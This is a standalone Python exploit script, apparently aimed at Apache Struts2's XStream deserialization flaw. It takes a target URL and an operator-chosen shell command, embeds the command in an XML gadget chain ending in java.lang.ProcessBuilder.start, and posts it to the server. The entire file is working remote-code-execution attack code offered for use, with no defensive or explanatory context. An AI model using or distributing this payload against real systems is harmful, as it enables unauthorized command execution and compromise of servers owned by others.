import requests
from optparse import OptionParser

headers = {
    'Content-Type': 'application/xml'
}


def send_payload(url, payload):
    requests.post(url, headers=headers, data=payload)


def process_command(command):
    commands = command.split()
    xml_commands = [f"<string>{cmd}</string>" for cmd in commands]
    return ''.join(xml_commands)


if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option('-u', '--url', help='S2 URL')
    parser.add_option('-c', '--command', type=str, help="Please input the command")
    options, args = parser.parse_args()

    if not options.url or not options.command:
        print("Please provide both the URL and the command.")
    else:
        url = options.url
        command = options.command
        new_command = process_command(command)

        payload = f"""<map> 
        <entry> 
        <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> 
        <command>{new_command}</command> 
        <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
        </entry> 
        </map>
        """
        send_payload(url, payload)
